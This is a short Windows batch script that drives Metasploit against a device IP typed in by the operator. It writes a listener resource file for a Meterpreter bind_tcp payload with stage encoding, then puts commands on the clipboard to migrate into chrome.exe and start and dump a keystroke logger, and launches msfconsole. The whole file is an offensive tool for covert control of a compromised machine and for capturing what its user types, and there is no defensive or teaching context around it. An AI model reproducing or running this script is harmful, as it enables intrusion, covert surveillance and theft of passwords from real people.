@echo off
title Control
:control1
cls
set /p ip_target=Device IP:
if "%ip_target%"=="" goto control1
cls
echo use exploit/multi/handler > "%temp%\Listener"
echo set payload windows/meterpreter/bind_tcp >> "%temp%\Listener"
echo set EnableStageEncoding true >> "%temp%\Listener"
echo set RHOST %ip_target% >> "%temp%\Listener"
echo exploit >> "%temp%\Listener"
cmd /c "echo.migrate -N chrome.exe& echo.keyscan_start& echo.keyscan_dump" | clip
msfconsole -q -r "%temp%\Listener"